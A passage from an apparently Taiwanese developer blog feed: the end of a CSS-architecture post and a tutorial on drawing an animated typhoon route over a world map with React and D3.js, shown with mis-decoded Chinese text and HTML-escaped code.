è³‡æ–™ä¾†æº
Intro-to-OOCSS
æ¼«è«‡ CSS æ¶æ§‹æ–¹æ³• - Kuro Hsu
Scalable CSS - ä»‹ç´¹OOCSS&#x2F;SMACSS&#x2F;BEM
Scalable and Modular Architecture for CSS
BEM
Atomic css ä»‹ç´¹

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>css</tag>
        <tag>atomic css</tag>
        <tag>methodology</tag>
      </tags>
  </entry>
  <entry>
    <title>D3v4 å·¥ä½œåŠ - React + D3 ç¹ªè£½ svg å‹•æ…‹è·¯ç·šåœ°åœ–</title>
    <url>/2017/07/21/d3-workshop-map/</url>
    <content><![CDATA[å‰è¨€ä»¥å‰åœ¨åšä¸€äº›è·Ÿåœ°åœ–æœ‰é—œçš„æ‡‰ç”¨æ™‚ï¼Œç¬¬ä¸€å€‹å‡ºç¾åœ¨è…¦æµ·çš„ä¸å¤–ä¹æ˜¯ Google Map å’Œ OpenStreetMapï¼Œç„¶å¾Œæ­é… Leaflet èˆ‡ Mapbox ç­‰å·¥å…·ä¾†å° map tile åšå„ç¨®åŠ å·¥æ¸²æŸ“ï¼Œç„¶è€Œåˆ°äº†å·¥ä½œä¸Šéœ€è¦æ™‚å°±æœƒç™¼ç¾é€™äº›å·¥å…·åœ¨ä¸ä»˜è²»ã€éµå®ˆæˆæ¬Šçš„ç‹€æ³ä¸‹ï¼Œå°±å‡ºç¾äº†å„ç¨®é™åˆ¶ï¼Œåƒæ˜¯éœ€è¦è‡ªå·±æ¶è¨­ tile server ä¾†è½‰æ› OpenStreetMap çš„åœ–è³‡ï¼Œæˆ–æ˜¯ request çš„æ¬¡æ•¸é™åˆ¶ç­‰ç­‰ã€‚
æƒ³äº†æƒ³ç™¼ç¾æœ€å¥½çš„æ›¿ä»£æ–¹æ¡ˆå°±æ˜¯ç›´æ¥ç”¨ svg ä¾†ç¹ªè£½ï¼Œé›–ç„¶æ²’æœ‰è¾¦æ³•åƒ Google Map é‚£èˆ¬è©³ç´°ï¼Œä½†åœ¨æŸäº›æ‡‰ç”¨ä¸Šä¾†èªªå°±éå¸¸è¶³å¤ ï¼Œæ•ˆæœä¹Ÿå¾ˆå¥½ï¼Œå› æ­¤ä»Šå¤©å°±ä¾†ç´€éŒ„ä¸€ä¸‹è©²å¦‚ä½•ä½¿ç”¨ D3.js èˆ‡ svg ä¾†ç¹ªè£½å‡ºæœ‰å‹•æ…‹è·¯ç·šåŠŸèƒ½çš„åœ°åœ–ï¼Œè®“å¤§å®¶å¯ä»¥åšå‡ºé¡ä¼¼ä¸­å¤®æ°£è±¡å±€çš„é¢±é¢¨è·¯ç·šé è¦½åœ–çš„ä½œå“ï¼
å…ˆçœ‹ä¸€ä¸‹æˆå“ï¼š(P.S. æœ€è¿‘ç™¼ç¾ codesandbox é€™å€‹æœå‹™ï¼Œæ¯”èµ·åœ¨ jsbin æˆ–æ˜¯ jsfiddle ä¸Šå¯« React ä¾†èªªå¥½ç”¨ä¸€äº›ï¼Œç¼ºé»æ˜¯ mobile é«”é©—è¼ƒå·®)


åœ°åœ–è³‡æ–™æœé›†è¦è‡ªå·±ç•«åœ°åœ–ï¼Œç•¶ç„¶å°±å¿…é ˆè‡ªå·±æº–å‚™å¥½åœ–è³‡ï¼Œçœ‹ä½ æƒ³è¦å°ç£åœ°åœ–æˆ–æ˜¯ä¸–ç•Œåœ°åœ–ï¼ŒåŸºæœ¬ä¸Šåœ¨ç¶²è·¯ä¸Šéƒ½èƒ½æ‰¾å¾—åˆ°ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨ç¶²è·¯è³‡æ–™çš„æ™‚å€™éƒ½éœ€è¦å°å¿ƒæˆæ¬Šæ¢æ¬¾ï¼Œä»¥ä¸–ç•Œåœ°åœ–ç‚ºä¾‹ï¼Œç›®å‰æˆ‘çœ‹åˆ°æœ€èƒ½è‡ªç”±é‹ç”¨çš„å°±æ˜¯ Natural Earth çš„è³‡æ–™äº†ï¼ŒåŸºæœ¬ä¸Šæœ‰åˆ†ä¸‰ç¨®æ¯”ä¾‹çš„åœ–è³‡ï¼Œ1:10mã€1:50m èˆ‡ 1:100m:

å¾ Natural Earth è¼‰ä¸‹ä¾†çš„æœƒæ˜¯ Vector dataï¼Œç„¡æ³•ç›´æ¥ä½¿ç”¨åœ¨ D3.js ä¸Šï¼Œå¥½åœ¨ D3.js çš„ä½œè€… Mike Bostock è£½ä½œçš„å¦ä¸€å¥—å·¥å…· topojson ä¸­å·²ç¶“æœ‰ parse éå¾Œçš„ TopoJSON æª”æ¡ˆï¼Œå¯ä»¥ç›´æ¥é€é https://unpkg.com/world-atlas@1/world/110m.json å–å¾—ï¼Œ50m çš„ä¹Ÿæœ‰ï¼Œå°±æ›ä¸€ä¸‹å¾Œé¢çš„æª”åå³å¯ã€‚
å¦‚æœä½ æƒ³è¦å…¶ä»– Natural Earth ä¸Šçš„è³‡æ–™ï¼Œå…¶å¯¦ä¹Ÿå¯ä»¥ä¿®æ”¹ world-atlas è£¡é¢çš„ script ä¾†è‡ªå·±è½‰æ›æˆ TopoJSONï¼Œå¯ä»¥åƒè€ƒæˆ‘ fork éä¾†ä¿®æ”¹çš„é€™ä»½æª”æ¡ˆ prepublish-populor-place.shï¼Œç”¨ä¾† parse Natural Earth ä¸Šçš„ popular_place dataã€‚
ç¹ªè£½åŸºæœ¬çš„ svg åœ°åœ–å·²ç¶“æœ‰äº†è³‡æ–™ä¾†æºï¼Œå°±å¯ä»¥é–‹å§‹å‹•æ‰‹å°‡åœ°åœ–ç¹ªè£½å‡ºä¾†äº†ï¼
é¦–å…ˆï¼ŒReact component çš„èµ·æ‰‹å¼å…ˆæº–å‚™å¥½ï¼š
WorldMap.jsximport React, &#123; Component &#125; from &#x27;react&#x27;;import &#123; render &#125; from &#x27;react-dom&#x27;;class WorldMap extends Component &#123;  constructor() &#123;    super()    this.state = &#123;      worlddata: [],      typhoonPath: [],      marker: &#123;&#125;,      graticule: geoGraticule10(),    &#125;  &#125;    componentDidMount() &#123;     fetch(&quot;https://unpkg.com/world-atlas@1/world/50m.json&quot;)      .then(response =&gt; &#123;        if (response.status !== 200) &#123;          console.log(`There was a problem: $&#123;response.status&#125;`)          return;        &#125;        response.json().then(worlddata =&gt; &#123;          this.setState(&#123;            worlddata: feature(worlddata, worlddata.objects.countries).features,          &#125;);        &#125;)      &#125;);  &#125;  render() &#123;    return (      &lt;svg className=&quot;map-svg&quot; width=&#123; 800 &#125; height=&#123; 600 &#125; viewBox=&quot;0 0 800 600&quot;&gt;      &lt;/svg&gt;    )  &#125;&#125;render(&lt;WorldMap /&gt;, document.getElementById(&#x27;root&#x27;));

æˆ‘åœ¨ componentDidMount çš„æ™‚å€™å»æŠ“å–åœ°åœ–è³‡æ–™ï¼Œæ¥è‘—æ‰ setState()ï¼Œä½†å¯¦éš›ä¸Šä½ çš„å°ˆæ¡ˆå¯ä»¥å…ˆæŠŠè³‡æ–™å­˜èµ·ä¾†ï¼Œé€™æ¨£ä¸€ä¾†åœ¨ render çš„åœ°æ–¹å°±å¯ä»¥ç›´æ¥å…ˆ render å‡º svg åœ°åœ–ï¼Œé€™å°æ–¼æ¡ç”¨ Server-side rendering çš„å°ˆæ¡ˆä¾†èªªæœƒæ–¹ä¾¿å¾ˆå¤šï¼Œå› ç‚ºå¦‚æœå…¨éƒ¨ç”¨ D3.js çš„è©±ï¼Œæœƒéœ€è¦å…ˆ select åˆ° DOM object æ‰èƒ½é€²è¡Œç¹ªè£½ï¼Œæœƒéº»ç…©ä¸€äº›ã€‚
åˆ©ç”¨ svg path ç¹ªè£½ä¸–ç•Œåœ°åœ–åœ¨ svg åº•ä¸‹ append ä¸€å€‹ groupï¼Œç„¶å¾Œ iterate state ä¸­çš„ä¸–ç•Œåœ°åœ–è³‡æ–™ï¼ŒåŠ ä¸Šæ¯å€‹å€å¡Šçš„ svg pathï¼š
world_map_path.js&lt;g className=&quot;countries&quot;&gt;    &#123;    this.state.worlddata.map((d,i) =&gt; (        &lt;path        key=&#123; `path-$&#123; i &#125;` &#125;        d=&#123; geoPath().projection(this.projection())(d) &#125;        className=&quot;country&quot;        fill=&#123; `rgba(219, 163, 43,$&#123; 1 / this.state.worlddata.length * i&#125;)` &#125;        stroke=&quot;#FFFFFF&quot;        strokeWidth=&#123; 0.5 &#125;        /&gt;    ))    &#125;&lt;/g&gt;
é€™é‚Šå…ˆçœ‹ä¸€ä¸‹æˆ‘å€‘ state ä¸­çš„ worlddata åˆ°åº•æ˜¯ä»€éº¼æ±è¥¿ï¼š

é€™æ˜¯ä¸€å€‹ TopoJSON çš„æ ¼å¼ï¼ŒTopoJSON ç°¡å–®ä¾†èªªå¯ä»¥ç•¶ä½œæ•ˆèƒ½æ›´å¥½çš„ GeoJSONï¼Œè©³ç´°ä»‹ç´¹å¯ä»¥çœ‹ é€™è£¡ã€‚Array è£¡é¢çš„æ¯ä¸€å€‹ object éƒ½æ˜¯ type ç‚º Feature çš„ç‰©ä»¶ï¼Œå…¶ä¸­çš„ geometry åŒ…å«äº†å¯¦éš›çš„åœ°ç†è³‡è¨Šï¼Œå¯èƒ½æ˜¯ä¸€å€‹ Polygonï¼Œä»¥åŠæ­¤ Polygon æ¯å€‹é»çš„åº§æ¨™ã€‚
æ¥è‘—æˆ‘å€‘éœ€è¦ä½¿ç”¨ d3-geo ä¸­çš„ geoPathï¼Œå…¶ä¸­æœ‰ projection() method èƒ½è®“æˆ‘å€‘æŠŠå‰›å‰›çš„åº§æ¨™æŠ•å½±ï¼ˆprojectï¼‰åˆ°æˆ‘å€‘ç¹ªè£½çš„åœ°åœ–ä¸Šã€‚
æŠ•å½±åœ¨åœ°åœ–çš„ç¹ªè£½ä¸­æ‰®æ¼”è‘—æ¥µç‚ºé‡è¦çš„è§’è‰²ï¼Œé€éæŠ•å½±ï¼Œæˆ‘å€‘æ‰èƒ½å°‡çœŸå¯¦ä¸–ç•Œçš„ç¶“ç·¯åº¦æ˜ å°„åˆ°æˆ‘å€‘ç¶²é ä¸Šå°å°çš„ svg ä¸­ã€‚
d3-geo ä¸­çš„ geoPath.projection() æœƒå›å‚³ä¸€å€‹ functionï¼Œè®“ä½ å‚³åœ°ç†è³‡è¨Šé€²å»ï¼Œæ¥è‘—å›å‚³æ˜ å°„éå¾Œçš„ svg pathï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä¸€é€£ä¸²çš„ svg mini languageï¼Œå°±æ˜¯ä¸‹åˆ—ç¨‹å¼ç¢¼ä¸­çš„ d çš„å…§å®¹ï¼š
&lt;path d=&quot;M 10 25         L 10 75         L 60 75         L 10 25&quot;

M ä»£è¡¨å°‡ ç­† ç§»å‹•åˆ° (10, 25)ï¼Œæ¥è‘— L ç•«ä¸€æ¢ç·šåˆ° (10, 75)ï¼Œä»¥æ­¤é¡æ¨ã€‚è©³ç´°ä»‹ç´¹å¯çœ‹ é€™è£¡ã€‚
ç•¶ç„¶ï¼Œä½ å¿…é ˆå‚³å…¥ä¸€å€‹åƒæ•¸ï¼Œå‘Šè¨´ geoPath.projection() ä½ æƒ³è¦æ˜ å°„çš„ç¯„åœç‚ºä½•ï¼Œä¹Ÿå°±æ˜¯ world_map_path.js ä¸­ #L6 æ‰€å‚³å…¥çš„ this.projection()ï¼š
projectionprojection() &#123;    return geoMercator()        .scale(1000)        .center([125.9605, 26.6978]);&#125;

ä¹Ÿæ˜¯å›å‚³ä¸€å€‹ Functionï¼Œåˆ©ç”¨åˆ° d3-geo çš„ geoMercatorï¼Œå¯ä»¥å®šç¾©å¥½ä½ è¦æ˜ å°„çš„ scale æ˜¯å¤šå¤§ï¼Œä¸­å¿ƒä½ç½®åœ¨å“ªã€‚
æœ€å¾Œç‚ºäº†è®“æ¯å€‹åœ‹å®¶çš„å€å¡Šæœ‰æ˜é¡¯å€åˆ†ï¼Œæˆ‘å€‘åœ¨ fill çš„åœ°æ–¹ï¼Œéš¨æ©Ÿçµ¦ä»–ä¸åŒçš„é¡è‰²ï¼Œfill=&#123; rgba(219, 163, 43,$&#123; 1 / this.state.worlddata.length * i&#125;) &#125;
åˆ°é€™å€‹æ­¥é©Ÿä½ å·²ç¶“å¯ä»¥ç•«å‡ºä¸‹é¢é€™æ¨£çš„åœ°åœ–äº†ï¼š


ç¹ªè£½å‹•æ…‹è·¯ç·š - è³‡æ–™æº–å‚™æ¥è‘—é€²è¡Œé‡é ­æˆ²ï¼Œæˆ‘å€‘è¦åœ¨åœ°åœ–ä¸Šç¹ªè£½å‡ºå‹•æ…‹çš„è·¯å¾‘åœ–ã€‚
ç¬¬ä¸€å€‹æ­¥é©Ÿä¹Ÿæ˜¯å…ˆæº–å‚™å¥½è³‡æ–™ï¼Œä»¥æ–‡ç« é–‹é ­çš„æˆå“ä¾†èªªï¼Œæ˜¯æˆ‘ä¿®æ”¹æŸå¹´çš„é¢±é¢¨è·¯å¾‘è³‡æ–™è€Œæˆçš„ï¼Œå¦‚æœæƒ³è¦ä¸²æ¥ç›®å‰çš„é¢±é¢¨è·¯å¾‘åœ–ï¼Œå¯ä»¥åˆ° æ°£è±¡è³‡æ–™é–‹æ”¾å¹³è‡º ç”³è«‹æœƒå“¡ï¼Œå°±å¯ä»¥æ‹¿åˆ° API Key å»ç´¢å–è³‡æ–™ï¼Œæ ¼å¼æœƒæ˜¯ xmlã€‚
API ç¯„ä¾‹ï¼šhttp://opendata.cwb.gov.tw/opendataapi?dataid=W-C0034-004&amp;authorizationkey=&#123;ä½ çš„ API key&#125;å…¶ä¸­ W-C0034-004 æ˜¯é¢±é¢¨è·¯å¾‘åœ–è³‡æ–™çš„ data idã€‚
è³‡æ–™ä¸­æœƒæœ‰ä¸‰å€‹å€‹ä¸»è¦éƒ¨åˆ†ï¼Œåˆ†åˆ¥æ˜¯éå»çš„è·¯å¾‘è³‡æ–™ (past)ã€ç¾åœ¨çš„ä½ç½® (curr) èˆ‡ æœªä¾†é æ¸¬çš„ä½ç½® (fcst)ï¼Œç°¡å–®çš„ parser å¯ä»¥åƒè€ƒæˆ‘çš„ gist
å‡ºä¾†çš„çµæœæ ¼å¼å¦‚ä¸‹ï¼Œä¸»è¦åŒ…å«ç¶“ç·¯åº¦åº§æ¨™èˆ‡é¢±é¢¨åŠå¾‘ï¼š
&#123;    &quot;pastData&quot;: [        &#123;            &quot;status&quot;: &quot;past&quot;,            &quot;time&quot;: &quot;2017-07-02T08:00:00+08:00&quot;,            &quot;coordinates&quot;: [                126.8,                20.9            ],            &quot;radius&quot;: 80        &#125;,        // ... éå¾€è³‡æ–™é€šå¸¸å¾ˆå¤š    ]    &quot;currData&quot;: [        &#123;            &quot;status&quot;: &quot;curr&quot;,            &quot;time&quot;: &quot;2017-07-05T02:00:00+08:00&quot;,            &quot;coordinates&quot;: [                142.5,                35.1            ],            &quot;radius&quot;: 120        &#125;    ],    &quot;fcstData&quot;: [        &#123;            &quot;status&quot;: &quot;fcst&quot;,            &quot;time&quot;: &quot;2017-07-05T14:00:00+08:00&quot;,            &quot;coordinates&quot;: [                150.5,                36.7            ],            &quot;radius&quot;: 120        &#125;    ]&#125;

ç¹ªè£½å‹•æ…‹è·¯ç·š - è·¯å¾‘ç¹ªè£½è³‡æ–™ç”¢ç”Ÿå¾Œï¼Œè¨˜å¾—å…ˆæ”¾åˆ° state ç•¶ä¸­ï¼š
const &#123; pastData, currData, fcstData &#125; = require(&#x27;./parsedWeatherData.json&#x27;);//...constructor() &#123;   super()   this.state = &#123;     worlddata: [],     typhoonPath: [...pastData, ...currData, ...fcstData],     marker: &#123; name: &quot;201701&quot;, coordinates: pastData[0].coordinates &#125;,   &#125; &#125;

é †ä¾¿åŠ ä¸Šä¸€å€‹ markerï¼Œç”¨ä¾†ä»£è¡¨é¢±é¢¨æœ¬é«”ï¼Œä»¥è·¯å¾‘åœ–çš„ç¬¬ä¸€å€‹ä½ç½®ç‚ºå…¶åº§æ¨™èµ·å§‹é»ã€‚
æ¥è‘—æˆ‘å€‘å¦å¤–å¯«ä¸€å€‹ renderLine() function ä¾†è™•ç†è·¯å¾‘ç¹ªè£½çš„éƒ¨åˆ†ï¼Œå› ç‚ºå¾…æœƒé‚„æœƒéœ€è¦åŠ ä¸Šå‹•ç•«æ•ˆæœï¼Œæœƒè¤‡é›œä¸€äº›ï¼š
renderLinerenderLine() &#123;    // åº§æ¨™æ˜ å°„    const pathCoordinates = [];    this.state.typhoonPath.forEach((path, i) =&gt; &#123;      pathCoordinates.push(&#123;        x: this.projection()(path.coordinates)[0],        y: this.projection()(path.coordinates)[1]      &#125;);    &#125;);        // ç·šæ®µç¹ªè£½å‡½æ•¸    const lineFunction = d3Line()      .x((d) =&gt; d.x)      .y((d) =&gt; d.y)      .curve(curveCatmullRom);    // å¢åŠ  svg å…ƒç´     // add path    d3Select(&#x27;svg&#x27;)      .append(&#x27;g&#x27;)      .append(&#x27;path&#x27;)      .attr(&#x27;class&#x27;, &#x27;typhoonPath&#x27;)      .attr(&#x27;d&#x27;, lineFunction(pathCoordinates))      .attr(&#x27;fill&#x27;, &#x27;none&#x27;)      .attr(&#x27;stroke&#x27;, &#x27;red&#x27;)      .attr(&#x27;stroke-width&#x27;, &#x27;5px&#x27;);    // add marker    d3Select(&#x27;svg&#x27;)      .append(&#x27;g&#x27;)      .append(&#x27;circle&#x27;)        .attr(&quot;transform&quot;, () =&gt; &#123;            const x = this.projection()(this.state.marker.coordinates)[0]            const y = this.projection()(this.state.marker.coordinates)[1]            return `translate($&#123;x&#125;, $&#123;y&#125;)`;        &#125;)        .attr(&#x27;r&#x27;, 10)        .attr(&#x27;fill&#x27;, &#x27;yellow&#x27;)        .attr(&#x27;opacity&#x27;, 0.7)        .attr(&#x27;class&#x27;, &#x27;typhoonMarker&#x27;);    const linePath = d3SelectAll(&#x27;path.typhoonPath&#x27;);      &#125;

ç¹ªè£½è·¯ç·šçš„ renderLine() å¯ä»¥æ‹†æˆä¸‰éƒ¨åˆ†ä¾†èªªæ˜ï¼š

åº§æ¨™æ˜ å°„ï¼š ç”±æ–¼æˆ‘å€‘è‡ªå·± parse çš„è·¯å¾‘è³‡æ–™ä¸¦é TopoJSONï¼Œè€Œä¸”é‚„å€åˆ†æˆä¸åŒæ™‚é–“çš„è³‡æ–™ï¼Œæ‰€ä»¥æˆ‘å€‘å…ˆå€‹åˆ¥å°‡è·¯å¾‘æ˜ å°„å¥½åº§æ¨™é»ï¼Œå†ä¸²æ¥åˆ°ä¸€å€‹ Array ä¸­ï¼Œæ–¹ä¾¿å¾ŒçºŒç¹ªè£½ã€‚ æˆ‘å€‘å…ˆå‰æåˆ°çš„ projection() éå¸¸å¥½ç”¨ï¼Œåªè¦å‚³å…¥ä¸€å€‹å«æœ‰ x, y ç¶“ç·¯åº¦çš„ç‰©ä»¶ï¼Œå°±èƒ½å¹«æˆ‘å€‘åœ¨è¨­å®šçš„ scale ä¸­æ˜ å°„å‡ºå°æ‡‰ä½ç½®ï¼šthis.projection()(path.coordinates)ï¼Œæœƒå›é‚„ä¸€å€‹ Arrayï¼Œåˆ†åˆ¥ç‚ºç¶“åº¦å’Œç·¯åº¦ã€‚

ç·šæ®µç¹ªè£½å‡½æ•¸ï¼š åœ¨ D3.js ä¸­ï¼Œattribute å¯ä»¥å‚³å…¥ functionï¼Œé€™é‚Šæˆ‘å€‘åˆ©ç”¨ d3-shape ä¸­çš„ lineï¼ˆ code è£¡é¢çš„ d3Line æ˜¯æˆ‘ import å¾Œçš„è®Šæ•¸åç¨±)ä¾†å¹«å¿™å°‡æ˜ å°„å¾Œçš„åº§æ¨™ x, y è½‰æ›æˆ svg path çš„ d valueã€‚ å…¶ä¸­ curve æ˜¯ d3-shape.line çš„è£œé–“å‡½æ•¸ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æ±ºå®šç·šæ®µä¸­ï¼Œæ¯å€‹ é» èˆ‡ é» ä¹‹é–“è©²æ€éº¼ é€£æ¥ï¼Œçœ‹éé€™å€‹å°ç…§æ‡‰è©²æœƒæ¯”è¼ƒèƒ½äº†è§£ï¼š v4 curve interpolation comparison 

å¢åŠ  svg å…ƒç´ ï¼š é€™å°±æ˜¯æœ€åŸºæœ¬çš„æ­¥é©Ÿå›‰ï¼Œd3-select å‡º svg å¾Œï¼Œå† append ä¸Šæˆ‘å€‘è¦çš„ line path èˆ‡ markerï¼Œæœ‰å¯«é D3.js çš„å‹¢å¿…ä¸é™Œç”Ÿã€‚


åœ¨ componentDidMount() çš„åœ°æ–¹åŠ ä¸Š renderLine() å‡½æ•¸ï¼Œå°±å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çµæœï¼š


ç¹ªè£½å‹•æ…‹è·¯ç·š - åŠ ä¸Šå‹•æ…‹è·¯å¾‘æ•ˆæœæ¥è‘—æˆ‘å€‘è¦è®“é€™å€‹è·¯å¾‘ æ´»èµ·ä¾†ï¼
è¦è®“ svg ç·šæ®µæœ‰å‹•ç•«èˆ¬çš„æ•ˆæœå…¶å¯¦å¾ˆç°¡å–®ï¼Œåˆ©ç”¨ svg çš„ stroke-dasharray é€™å€‹å±¬æ€§å³å¯ï¼Œè©³ç´°çš„å¯¦ä½œåŸç†å¯ä»¥çœ‹ css-tricks ä¸Šçš„é€™ç¯‡æ–‡ç«  How SVG Line Animation Worksï¼Œè§£é‡‹çš„éå¸¸æ¸…æ¥šï¼Œåªæ˜¯è£¡é¢èªªçš„åšæ³•æ˜¯é€é CSS çš„ animationï¼Œè·Ÿæˆ‘å€‘é€™é‚Šæœ‰äº›å¾®å·®ç•°ï¼Œä½†æ˜¯åŸç†æ˜¯ç›¸åŒçš„ã€‚

é‡é»å°±åœ¨æ–¼ï¼Œå°‡åŸå§‹çš„ **ç›´ç·š** è½‰æ›ç‚º **è™›ç·š**ï¼Œé€éæ”¹è®Šè©²è™›ç·šçš„ **dasharray** å€é–“ï¼Œä¾†åšå‡ºå‹•æ…‹çš„æ•ˆæœã€‚


stroke-dasharray çš„åƒæ•¸æ˜¯ ( dash çš„é•·åº¦, gap çš„é•·åº¦ ))ï¼Œæˆ‘å€‘åªè¦å›ºå®š gap çš„é•·åº¦ç‚ºç·šæ®µé•·ï¼Œç„¶å¾Œè®“ dash çš„é•·åº¦å¾é›¶æ…¢æ…¢è½‰æ›æˆç·šæ®µé•·å³å¯é”åˆ°å‹•ç•«æ•ˆæœï¼
æ‰€ä»¥æˆ‘å€‘åŠ ä¸Šä¸€å€‹ transition å‡½æ•¸ï¼š
transitiontransition(linePath) &#123;    const self = this;    linePath.transition()      .duration(15000)      .attrTween(&quot;stroke-dasharray&quot;, this.translateFn.bind(this, linePath))      .on(&#x27;end&#x27;, () =&gt; &#123;        setTimeout(() =&gt; &#123;           d3Select(this).call(self.transition.bind(self, linePath)); // infinite loop        &#125;, 1500);      &#125;);&#125;

linePath æ˜¯ d3-select åˆ°çš„è·¯å¾‘ path å…ƒä»¶ã€‚é€é transition() èˆ‡ attrTween() ä¾†å‹•æ…‹èª¿æ•´ stroke-dasharray çš„å€¼ï¼Œä¸¦ä¸”åœ¨æœ€å¾Œç›£è½ä¸€å€‹ end äº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯ç•¶æ¯æ¬¡å‹•ç•«çµæŸä»¥å¾Œï¼Œæˆ‘å€‘éš”å€‹ 1.5 ç§’å†é‡æ–°å‘¼å«ä¸€æ¬¡ transition()ï¼Œé€²è¡Œ loopã€‚
[Note]é€™é‚Šè¦æ³¨æ„çš„æ˜¯ï¼ŒlinePath é›–ç„¶æ˜¯é€é d3-select å–å¾—çš„å…ƒä»¶ï¼Œè¦å‘¼å«ä»–çš„ transition() å‡½å¼çš„è©±ï¼Œæœƒéœ€è¦é¡å¤–åŠ å…¥ d3-transition çš„ lib æ‰è¡Œï¼Œä»–æœƒå°‡ transition bind åˆ°å…ƒä»¶ä¸­ï¼šimport &#123; transition as d3Transition &#125; from &#39;d3-transition&#39;;
attrTween æœƒå°‡ transition éç¨‹ä¸­çš„æ™‚é–“ç•¶ä½œåƒæ•¸ä¸Ÿé€²å»çµ¦å®ƒçš„ valueï¼Œè€Œè©² value æ‰®æ¼”è‘—è™•ç† è£œé–“å‹•ç•« çš„è§’è‰²ï¼Œæ˜¯ä¸€å€‹ input ç‚ºæ™‚é–“çš„è£œé–“å‡½å¼ï¼Œæˆ‘å€‘é€™é‚ŠåŸ·è¡Œä¸€å€‹translateFn()ï¼Œç”¨ä¾†è™•ç†æˆ‘å€‘è£œé–“å‹•ç•«éç¨‹ä¸­éœ€è¦åšçš„äº‹æƒ…ï¼Œä»¥åŠå®šç¾©è£œé–“å‹•ç•«å‡½å¼çš„å…§å®¹ï¼š
translateFntranslateFn(linePath) &#123;    const self = this;    // å›å‚³ input ç‚º time çš„è£œé–“å‡½å¼    return (t) =&gt; &#123;        const l = linePath.node().getTotalLength();        const p = linePath.node().getPointAtLength(t * l);        const marker = d3Select(&#x27;.typhoonMarker&#x27;);        marker.attr(&quot;transform&quot;, `translate($&#123;p.x&#125;, $&#123;p.y&#125;)`);        marker.style(&quot;transition&quot;, &#x27;r 1.5s&#x27;);        marker.attr(&quot;r&quot;, 10);        const interpolate = d3Interpolate(`0,$&#123;l&#125;`, `$&#123;l&#125;,$&#123;l&#125;`);        return interpolate(t);    &#125;&#125;

å¦‚åŒå…ˆå‰æåˆ°çš„ï¼Œæˆ‘å€‘è¦æ”¹è®Š stroke-dasharray çš„å€é–“ï¼Œä¹Ÿå°±æ˜¯è¦è®“ç¬¬ä¸€å€‹åƒæ•¸ï¼Œdash çš„é•·åº¦éå¢ç‚ºç·šæ®µé•·ï¼Œç·šæ®µé•·åº¦å¯ä»¥å¾ linePath.node().getTotalLength() å–å¾—ï¼Œé€é d3-interpolate å¹«åŠ©æˆ‘å€‘ç”¢ç”Ÿä¸€å€‹è£œé–“å‡½å¼ interpolate(t)ï¼Œè£œå®Œ 0, ç·šæ®µé•· -&gt; ç·šæ®µé•·, ç·šæ®µé•· é€™æ®µåƒæ•¸çš„è®ŠåŒ–ï¼Œä¸¦ä¸”å›å‚³å‡ºå»çµ¦ attrTweenã€‚
d3 çš„æ–‡ä»¶éƒ½é¡¯å¾—è »è©³ç´°çš„ï¼Œd3-interpolate é€™é‚Šæœ‰èªªæ˜ä¸åŒçš„ input type æœƒæ¡ç”¨ä¸åŒçš„è£œé–“å‡½å¼ä¾†è™•ç†ï¼Œä¾‹å¦‚å­—ä¸²ã€æ™‚é–“ã€æ•¸å­—ç­‰ç­‰ã€‚
åŠ ä¸Šäº†é€™å€‹ tranlsateFn å¾Œï¼Œç·šæ®µå°±æ´»èµ·ä¾†äº†ï¼


åœ¨å‰›å‰›çš„ translateFn ä¸­æˆ‘å€‘å…¶å¯¦é‚„åšäº†ä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯è®“ Marker è·Ÿè‘—ç·šæ®µç§»å‹•ï¼Œé€é const p = linePath.node().getPointAtLength(t * l); å–å¾—ç·šæ®µåœ¨è©²æ™‚é–“çš„ point ä½ç½®ï¼Œä¸¦ transform éå»ã€‚
ä½†é€™æ¨£é‚„ä¸å¤ ï¼Œæ—¢ç„¶æ˜¯æƒ³è¦æœ‰é¢±é¢¨è·¯å¾‘çš„æ•ˆæœï¼Œæ€éº¼å¯ä»¥ç¼ºå°‘äº†æš´é¢¨åŠå¾‘çš„è³‡è¨Šå‘¢ï¼Ÿ
è¨˜å¾—æˆ‘å€‘åŸæœ¬ parse å‡ºä¾†çš„è³‡æ–™ä¸­æœ‰å€‹ radius çš„å€¼å—ï¼Ÿæˆ‘å€‘å¯ä»¥åœ¨ translateFn ä¸­æŠ“å‡ºç›®å‰è³‡æ–™çš„åŠå¾‘å€¼ï¼Œç„¶å¾Œæ”¾åˆ° marker çš„ r attribute ä¸­ï¼š
self.state.typhoonPath.forEach((path) =&gt; &#123;        const pixelLocSource = self.projection()(path.coordinates);        if (Math.floor(p.x) === Math.floor(pixelLocSource[0])) &#123;          const radius = this.distanceCalculate(pixelLocSource, path.coordinates, path.radius);          marker.attr(&quot;r&quot;, radius);        &#125;      &#125;);

ä½†é€™é‚Šé‚„æœ‰å€‹å°å•é¡Œï¼Œè³‡æ–™ä¸­ï¼ŒåŠå¾‘çš„å–®ä½æ˜¯ kmï¼Œæˆ‘è¦æ€éº¼è®“å®ƒè½‰æ›æˆ svg ä¸­çš„è·é›¢å‘¢ï¼Ÿï¼æˆ‘å€‘ä¹‹å‰çš„æŠ•å½±å‡½å¼ projection() åªèƒ½æ¥å—åº§æ¨™åƒæ•¸ï¼Œæ²’è¾¦æ³•ç›´æ¥è½‰æ›è·é›¢å•Šï¼
åˆ¥æ…Œå¼µï¼Œé‚£æˆ‘å€‘å°±å…ˆè¨ˆç®—å‡ºä¸­å¿ƒé»åˆ°é€™æ®µåŠå¾‘å¾Œçš„åº§æ¨™ï¼Œåœ¨è½‰æ›æˆåœ°åœ–ä¸Šçš„é»ï¼Œæ¥è‘—åˆ©ç”¨åœ‹é«˜ä¸­æ•¸å­¸è¨ˆç®—å‡ºè·é›¢å³å¯ï¼
distanceCalculatedistanceCalculate(pixelLocSource, [longitude, latitude], distance)&#123;	    // Latitude: 1 deg = 110.574 km    // Longitude: 1 deg = 111.320*cos(latitude) km    const lat_diff = distance / 110.574;    const lon_distance = 111.320 * Math.cos(latitude * Math.PI / 180);    const lon_diff = distance / lon_distance;      const E = longitude + Math.abs(lon_diff);    const pixelLoc = this.projection()([E, latitude]);    // distance calculate    return Math.sqrt(Math.pow(pixelLocSource[0] - pixelLoc[0], 2)        + 